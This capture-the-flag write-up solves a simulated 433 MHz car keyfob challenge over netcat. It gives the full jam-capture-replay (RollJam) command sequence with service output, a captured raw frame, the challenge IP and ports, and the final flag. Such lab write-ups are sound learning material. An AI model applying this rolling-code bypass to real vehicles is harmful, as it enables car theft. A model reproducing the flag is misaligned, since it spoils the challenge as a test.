### Challenge Description
```
Saltlock Drift
Stormbound outriders recovered a salt crusted gatecar outside the Sunken Causeway. Its remote lock still listens across a shared band that the wardens use during convoy checks. Reach the channel, study the signals, and reveal the token through a replay attack.
```

In short: RF keyfob service on 433.920 MHz (OOK, raw-hex) → jam the channel → capture a fresh unlock frame from the physical keyfob → replay it with `TX` → door unlocks → flag.

### Tools & Environment
- Kali Linux
- netcat / ncat
- Browser for the web UI (physical keyfob + receiver state)
- No SDR hardware, no GNU Radio, no reverse engineering — pure protocol abuse on a simulated RF channel
- Starting point: IP + two ports + a long fantasy story about a salt-crusted gatecar

### 1. First Contact & The Usual Flavour Trap

The description screamed “hardware / RF / rolling code”. Two ports were given:

- `154.57.164.72:30384` → pretty web UI with a low-poly car, Physical Keyfob buttons (UNLOCK / LOCK), Receiver State (Door / Channel / Counter / Band) and a live event log.
- `154.57.164.72:32431` → the actual RF service.

nmap and a quick browser visit confirmed the web UI was just a front-end that triggered “physical” keyfob presses. The real work was on the second port.

**Stupid mistake #1:**  
Spending the first few minutes clicking UNLOCK/LOCK on the web and watching the counter go up, hoping the flag would magically appear. It didn’t. The counter just kept climbing and the door stayed locked.

### 2. Reaching the Shared Channel

```bash
nc 154.57.164.72 32431
```

Banner:

```
RiverGate RF-433 shared service channel
freq=433.920MHz modulation=OOK encoding=raw-hex
commands: HELP, STATUS, JAM ON, JAM OFF, TX <hex>, QUIT
physical keyfob frames are mirrored here as RX lines
```

`STATUS` showed:

```
lock=locked jammer=off last_counter=23014 flag=hidden ...
```

Every time we pressed the web keyfob we got clean RX lines:

```
RX ... raw=AAAAAAAA2DD4534C540259E719D1EE423678
CAR ACCEPT source=fob button=unlock counter=23015 result=owner_unlock
```

The frames contained a changing counter. Simple replay of an already-accepted packet was useless — classic rolling code.

### 3. Realising It Was RollJam Territory

The presence of `JAM ON` / `JAM OFF` made the attack path obvious. This is the textbook jam-and-replay (RollJam-style) scenario:

1. Jam so the car never sees the legitimate frame.
2. Capture the fresh frame that the car has never accepted.
3. Stop jamming and replay it yourself.

### 4. The Actual Exploitation (and the small amount of fumbling)

**First attempt path that worked:**

```
JAM ON
```
→ Channel status became `jammed`.

Pressed UNLOCK once on the web UI.

```
RX ... raw=AAAAAAAA2DD4534C540259E9931651181AA8
CAR MISS source=fob button=unlock reason=channel_jammed
```

Perfect — the frame was delivered to us but rejected by the car.

```
JAM OFF
TX AAAAAAAA2DD4534C540259E9931651181AA8
STATUS
```

Result:

```
CAR ACCEPT source=attacker button=unlock counter=23017 result=exploit_unlock
STATUS lock=unlocked jammer=off last_counter=23017 flag=visible ...
```

The web UI immediately showed the flag.

### 5. All the Stupid Things We Hit

| Problem | What happened | Fix |
|---------|---------------|-----|
| Believed the story too hard | Spent time staring at the car animation and counter instead of the RF service | Always open the non-HTTP port first |
| Clicked the keyfob without jamming | Counter advanced, packets were accepted, nothing useful captured | JAM first, then press |
| Tried replaying an already-accepted packet | Car ignored it (rolling code working as designed) | Only replay frames that arrived while jammed |
| Slightly messy command order | Once sent TX while still jammed — nothing happened | Strict sequence: JAM ON → capture → JAM OFF → TX |
| Expected a complicated signal analysis | Everything was already handed to us in raw-hex | Read the banner and the available commands |

### 6. Lessons Learned

1. Fantasy flavour text is almost never a technical requirement. “Salt crusted gatecar” and “Sunken Causeway” do not mean you need an SDR or a custom demodulator.
2. When a service explicitly offers `JAM ON` and mirrors every physical frame as `RX`, the intended path is almost always jam → capture → replay.
3. Rolling codes are only secure if the legitimate receiver actually sees the packets. Prevent that and you own the next valid code.
4. Keep the interaction as short and linear as possible. The moment you start over-complicating the sequence you introduce timing and state bugs.
5. After the door unlocks, check both the `STATUS` output **and** the web UI — the flag can appear in either place.

### One-sentence path

nc to the RF port → `JAM ON` → press physical UNLOCK → capture the `CAR MISS` raw hex → `JAM OFF` → `TX <captured hex>` → door unlocks → flag.

**Flag**
```
HTB{r0llj4m_5alt_f0b_5pl1t_1896d6fa0d41d5502aff5f152caa46b9}
```